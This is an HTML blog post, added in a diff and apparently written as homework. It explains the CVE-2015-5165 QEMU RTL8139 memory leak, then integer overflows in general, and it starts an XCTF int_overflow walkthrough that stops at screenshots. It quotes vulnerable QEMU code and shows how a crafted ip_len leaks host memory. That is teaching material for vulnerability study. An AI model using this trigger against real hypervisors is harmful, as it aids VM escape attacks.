@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="Drag0nf1y" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    CVE-2015-5165  &amp; 整数溢出 |  Drag0nf1y
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-作业" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  CVE-2015-5165  &amp; 整数溢出
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2021/05/24/%E4%BD%9C%E4%B8%9A/" class="article-date">
+  <time datetime="2021-05-24T07:11:48.000Z" itemprop="datePublished">2021-05-24</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a> / <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E/qemu/">qemu</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.7k字</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">11分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="CVE-2015-5165-amp-整数溢出"><a href="#CVE-2015-5165-amp-整数溢出" class="headerlink" title="CVE-2015-5165  &amp; 整数溢出"></a>CVE-2015-5165  &amp; 整数溢出</h1><h1 id="基础题1-：分析一个已知漏洞成因"><a href="#基础题1-：分析一个已知漏洞成因" class="headerlink" title="基础题1 ：分析一个已知漏洞成因"></a>基础题1 ：分析一个已知漏洞成因</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>CVE-2015-5165:   该漏洞主要是进行内存泄漏，需要获取到 QEMU 在宿主机中 <code>.text</code> 段的基地址（用来放 Shellcode）以及用于模拟客户机物理内存的虚拟内存基地址（方便获取一些结构体的地址）。REALTEK 网卡支持两种接收/传输模式：C 和 C+。当网卡使用 C+ 模式时，网卡会算错 IP 流量包的长度，并发送远大于实际长度的数据信息。具体的漏洞点在 <code>hw/net/rtl8139.c</code> 的 <code>rtl8139_cplus_transmit_one</code> 函数中。当虚拟机往 RTL8139 网卡发送数据包的时，QEMU 会调用该函数进行处理。</p>
+<h2 id="1-2-漏洞点"><a href="#1-2-漏洞点" class="headerlink" title="1.2 漏洞点"></a>1.2 漏洞点</h2><blockquote>
+<p>\qemu\hw\net\rtl8139.c</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_cplus_transmit_one</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ……</span><br><span class="line">        <span class="keyword">if</span> (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN))</span><br><span class="line">        &#123;</span><br><span class="line">            DPRINTF(<span class="string">"+++ C+ mode offloaded task checksum\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* ip packet header */</span></span><br><span class="line">            ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;				<span class="comment">//注意：ip_data_len的数据类型为uint16_t，若赋值为负数，则会出现整形溢出</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line">            <span class="keyword">if</span> (proto == ETH_P_IP)</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"+++ C+ mode has IP packet\n"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* not aligned */</span></span><br><span class="line">                eth_payload_data = saved_buffer + ETH_HLEN;</span><br><span class="line">                eth_payload_len  = saved_size   - ETH_HLEN;</span><br><span class="line"></span><br><span class="line">                ip = (ip_header*)eth_payload_data;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">                    DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">                        <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">                        IP_HEADER_VERSION_4);</span><br><span class="line">                    ip = <span class="literal">NULL</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    hlen = IP_HEADER_LENGTH(ip);				<span class="comment">//ip数据包头的长度:IP_HEADER_LENGTH(ip) (((ip-&gt;ip_ver_len)&amp;0xf) &lt;&lt; 2)</span></span><br><span class="line">                    ip_protocol = ip-&gt;ip_p;						</span><br><span class="line">                    ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;<span class="comment">//ip数据的长度</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">   ……</span><br></pre></td></tr></table></figure>
+
+<p>其中ip的数据结构为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip_header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_ver_len;    <span class="comment">/* version and header length */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_tos;        <span class="comment">/* type of service */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_len;        <span class="comment">/* total length */</span>			<span class="comment">//ip-&gt;ip_len</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_id;         <span class="comment">/* identification */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_off;        <span class="comment">/* fragment offset field */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_ttl;        <span class="comment">/* time to live */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_p;          <span class="comment">/* protocol */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_sum;        <span class="comment">/* checksum */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ip_src,ip_dst; <span class="comment">/* source and dest address */</span></span><br><span class="line">&#125; ip_header;</span><br></pre></td></tr></table></figure>
+
+<p>在这里<code>ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</code></p>
+<p>代码中并没有检查 <code>be16_to_cpu(ip-&gt;ip_len)</code> 是否大于等于 <code>hlen</code>，且 IP 数据报传输数据长度 <code>ip_data_len</code> 被定义为 <code>uint16_t</code>，导致这里可以构造出一个很大的传输数据长度（比如构造 <code>ip-&gt;ip_len=hlen-1</code>，使得 <code>ip_data_len</code> 的值为 -1，也就是 65535）。之后看看 <code>ip_data_len</code> 是怎么用的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">   ……</span><br><span class="line">                    <span class="keyword">int</span> tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line">                    <span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;			<span class="comment">//tcp_data_len与ip_data_len有关</span></span><br><span class="line">                    <span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"></span><br><span class="line">                    DPRINTF(<span class="string">"+++ C+ mode TSO IP data len %d TCP hlen %d TCP "</span></span><br><span class="line">                        <span class="string">"data len %d TCP chunk size %d\n"</span>, ip_data_len,</span><br><span class="line">                        tcp_hlen, tcp_data_len, tcp_chunk_size);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* note the cycle below overwrites IP header data,</span></span><br><span class="line"><span class="comment">                       but restores it from saved_ip_header before sending packet */</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//下面这一段主要是将TCP数据按照chunk_size 分组封装为IP包由rtl8139_transfer_frame()发送出去</span></span><br><span class="line">                    <span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">                        <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">                        &#123;</span><br><span class="line">                            is_last_frame = <span class="number">1</span>;</span><br><span class="line">                            chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        DPRINTF(<span class="string">"+++ C+ mode TSO TCP seqno %08x\n"</span>,</span><br><span class="line">                            be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">                        <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">                        <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">                        DPRINTF(<span class="string">"+++ C+ mode TSO calculating TCP checksum for "</span></span><br><span class="line">                            <span class="string">"packet with %d bytes data\n"</span>, tcp_hlen +</span><br><span class="line">                            chunk_size);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        ……</span><br><span class="line">                        rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">                            <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">                        p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">                        ++send_count;</span><br><span class="line">                    &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p>主要是将TCP数据按照<code>chunk_size</code> 大小 ，分组封装为IP包由<code>rtl8139_transfer_frame()</code>发送出去，<code>tcp_send_offset</code>就是已经发送的的数据，按照<code>chunk_size</code>来累积。</p>
+<p>因为<code>ip_data_len</code>被溢出为很大的值(65535)，因此<code>int tcp_data_len = ip_data_len - tcp_hlen;</code>计算后得到的<code>tcp_data_len</code>也会很大，因为<code>ip_data_len</code>已经被覆盖成了负数（最大可为65535），因此后面的代码<code>memcpy((uint8_t*)p_tcp_hdr + tcp_hlen, (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</code>会将<code>p_tcp_hdr</code>正常的数据以外的额外的数据拷贝出来，通过<code>rtl8139_transfer_frame</code>发送出去。因此会将本来的数据后面的数据通过    <code>rtl8139_transfer_frame</code>发送出去。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> <span class="built_in">size</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vlan_iov</span>[3];</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">size</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ empty ethernet frame\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dot1q_buf &amp;&amp; <span class="built_in">size</span> &gt;= ETHER_ADDR_LEN * <span class="number">2</span>) &#123;</span><br><span class="line">        iov = (struct iovec[<span class="number">3</span>]) &#123;</span><br><span class="line">            &#123; .iov_base = buf, .iov_len = ETHER_ADDR_LEN * <span class="number">2</span> &#125;,</span><br><span class="line">            &#123; .iov_base = (<span class="keyword">void</span> *) dot1q_buf, .iov_len = VLAN_HLEN &#125;,</span><br><span class="line">            &#123; .iov_base = buf + ETHER_ADDR_LEN * <span class="number">2</span>,</span><br><span class="line">                .iov_len = <span class="built_in">size</span> - ETHER_ADDR_LEN * <span class="number">2</span> &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(vlan_iov, iov, <span class="keyword">sizeof</span>(vlan_iov));</span><br><span class="line">        iov = vlan_iov;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//判断TxLoopBack位是否置位 ：TxLoopBack = (1 &lt;&lt; 18) | (1 &lt;&lt; 17), /* enable loopback test mode */</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ transmit loopback mode\n"</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, <span class="built_in">size</span>, do_interrupt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            g_free(buf2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            qemu_sendv_packet(qemu_get_queue(s-&gt;nic), iov, <span class="number">3</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            qemu_send_packet(qemu_get_queue(s-&gt;nic), buf, <span class="built_in">size</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看<code>rtl8139_transfer_frame</code>函数，当Tx寄存器包含<code>TxLoopBack</code>标志位时，程序会调用<code>rtl8139_do_receive</code>函数降数据回发送回给自己。</p>
+<p>其中相关的结构体：</p>
+<p><code>RTL8139_registers</code>保存了相关寄存器：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line"><span class="number">0x00</span>    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line"><span class="number">0x10</span>    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line"><span class="number">0x20</span>    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line"><span class="number">0x30</span>    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line"><span class="number">0x40</span>    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line"><span class="number">0xd0</span>    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line"><span class="number">0xe0</span>    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure>
+
+<p>其在<code>qemu</code>中对应的结构体为<code>RTL8139_registers</code>，其中比较关键的部分如下：</p>
+<ul>
+<li><code>MAC0</code>：mac地址</li>
+<li><code>MAR0</code>:  子网掩码</li>
+</ul>
+<ul>
+<li><code>TxConfig</code>：开启/关闭Tx的标记，包括TxLoopBack （开启loopback测试模式）以及TxCRC (Tx包是否添加校验码)。</li>
+<li><code>RxConfig</code>：开启/关闭Rx的标记，比如AcceptBroadcast（接收广播包）， AcceptMulticast（接收组播包）等。</li>
+<li><code>CpCmd</code>：C+指令寄存器用来执行一些函数，比如 CplusRxEnd（允许接收），CplusTxEnd（允许发送）等。</li>
+<li><code>TxAddr0</code>：Tx表的物理内存地址。</li>
+<li><code>RxRingAddrLO</code>：Rx表的物理内存地址的低32位。</li>
+<li><code>RxRingAddrHI</code>：Rx表的物理内存地址的高32位。</li>
+<li><code>TxPoll</code>：告诉网卡检查Tx缓冲区。</li>
+</ul>
+<h1 id="基础题2：分析一个已知的共性漏洞利用技术"><a href="#基础题2：分析一个已知的共性漏洞利用技术" class="headerlink" title="基础题2：分析一个已知的共性漏洞利用技术"></a>基础题2：分析一个已知的共性漏洞利用技术</h1><h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><h2 id="1-1-介绍-1"><a href="#1-1-介绍-1" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>当数据大小超过数据类型的大小，就会产生溢出。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>字节</th>
+<th>范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>short int</td>
+<td>2byte(word)</td>
+<td>0<del>32767(0</del>0x7fff)   -32768<del>-1(0x8000</del>0xffff)</td>
+</tr>
+<tr>
+<td>unsigned short int</td>
+<td>2byte(word)</td>
+<td>0<del>65535(0</del>0xffff)</td>
+</tr>
+<tr>
+<td>int</td>
+<td>4byte(dword)</td>
+<td>0<del>2147483647(0</del>0x7fffffff)   -2147483648<del>-1(0x80000000</del>0xffffffff)</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>4byte(dword)</td>
+<td>0<del>4294967295(0</del>0xffffffff)</td>
+</tr>
+<tr>
+<td>long int</td>
+<td>8byte(qword)</td>
+<td>正: 0<del>0x7fffffffffffffff   负: 0x8000000000000000</del>0xffffffffffffffff</td>
+</tr>
+<tr>
+<td>unsigned long int</td>
+<td>8byte(qword)</td>
+<td>0~0xffffffffffffffff</td>
+</tr>
+</tbody></table>
+<p>根据数据溢出的大小，可以分为上界溢出和下界溢出。</p>
+<p>实际上是因为在存储的时候会被截断，比如超过位数，前面的值会被舍弃，只留下后面两字节的数据，造成的漏洞。</p>
+<h2 id="1-2-上界溢出"><a href="#1-2-上界溢出" class="headerlink" title="1.2 上界溢出"></a>1.2 上界溢出</h2><p>上界溢出有两种情况，一种是 <code>0x7fff + 1</code>， 另一种是 <code>0xffff + 1</code>。</p>
+<p><code>add 0x7fff, 1 == 0x8000</code>，这种上界溢出对无符号整型就没有影响，但是在有符号短整型中，<code>0x7fff</code> 表示的是 <code>32767</code>，但是 <code>0x8000</code> 表示的是 <code>-32768</code>，用数学表达式来表示就是在<strong>有符号短整型</strong>中 <code>32767+1 == -32768</code>。从正数变成了负数。</p>
+<p>对于<code>0xffff+1</code> 这种情况，对于有符号运算，是没有问题的。但是在<strong>无符号短整型</strong>中，<code>0xffff == 65535, 65535 + 1 == 0</code>。越界变成了零。</p>
+<h2 id="1-3-下界溢出"><a href="#1-3-下界溢出" class="headerlink" title="1.3 下界溢出"></a>1.3 下界溢出</h2><p>第一种是 <code>sub 0x0000, 1 == 0xffff</code>，对于有符号来说 <code>0 - 1 == -1</code> 没问题，但是对于<strong>无符号</strong>来说就成了 <code>0 - 1 == 65535</code>。</p>
+<p>第二种是 <code>sub 0x8000, 1 == 0x7fff</code>，对于无符号来说是 <code>32768 - 1 == 32767</code> 是正确的，但是对于<strong>有符号</strong>来说就变成了 <code>-32768 - 1 = 32767</code>。</p>
+<p>在上一个漏洞中，就是出现了无符号整型这种下界溢出。-1溢出后得到了 65535.</p>
+<h2 id="1-4-漏洞利用"><a href="#1-4-漏洞利用" class="headerlink" title="1.4 漏洞利用"></a>1.4 漏洞利用</h2><p>整数溢出不同于一般的常见的bug，它不允许直接改写内存或直接控制程序流程，但它更难以捕获。问题的根源在于程序<br>无法在还没有发生整数溢出之前就检查出结果是否会发生溢出。因此，大多数整数溢出是无法利用的，尽管这样，在<br>某些条件下还是有可能让一些关键变量包含错误的值，进而引起其它bug。</p>
+<p>算数溢出最可能被利用的情况之一是利用计算结果来决定将要分配缓冲区的大小。通常程序需要为一组对象分配内存空间，因此它将把对象个数乘上单个对象大小的结果作为参数调用malloc(3) 或 calloc(3)来分配内存。<br>如果我们能够控制这两个操作数之一，我们就有可能让程序分配错误大小的缓冲区，如下程序片断所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int myfunction(int *array, int len)&#123;</span><br><span class="line">    int *myarray, i;</span><br><span class="line"></span><br><span class="line">    myarray &#x3D; malloc(len * sizeof(int));    &#x2F;* [1] *&#x2F;</span><br><span class="line">    if(myarray &#x3D;&#x3D; NULL)&#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i &#x3D; 0; i &lt; len; i++)&#123;              &#x2F;* [2] *&#x2F;</span><br><span class="line">        myarray[i] &#x3D; array[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return myarray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个实现错误的函数可能因为没有检查参数len而失败。在[1]处的乘法可能由于len太大而造成溢出，所以我们可以利用它来分配一个任意长度的缓冲区。通过选择合适的len值，我们可以让程序在[2]处的循环改写超出myarray范围的内存，这可以造成一个堆溢出，进而通过覆盖malloc的控制结构来执行任意代码，但对堆溢出的攻击超出了本文的范围，因此在此并不会详细叙述如何进行堆溢出攻击。</p>
+<p>无符号数被解释成有符号数或有符号数被解释成无符号数都可能造成符号bug。之所以会出现这种解释错误，原因在于在计算机内部无符号和有符号数的存储方法是一样的。最近，FreeBSD和OpenBSD内核中就出现了好几个符号处理不当的bug。</p>
+<p>符号bug具有大量的表现形式, 常见的有：</p>
+<ul>
+<li>有符号整数用于比较</li>
+<li>有符号整数用于算数运算</li>
+<li>无符号整数和有符号整数比较</li>
+</ul>
+<p>存在控制控制流、敏感信息泄露等问题。</p>
+<h2 id="1-5-经典整数溢出案列：Xctf-int-overflow"><a href="#1-5-经典整数溢出案列：Xctf-int-overflow" class="headerlink" title="1.5 经典整数溢出案列：Xctf-int_overflow"></a>1.5 经典整数溢出案列：Xctf-int_overflow</h2><p><strong>0x01 int_overflow</strong></p>
+<p>main</p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152355466.png" alt="image-20210521152355466"></p>
+<p>login</p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152409684.png" alt="image-20210521152409684"></p>
+<p>读入密码为0x199长度</p>
+<p>check_passwd</p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152424286.png" alt="image-20210521152424286"></p>
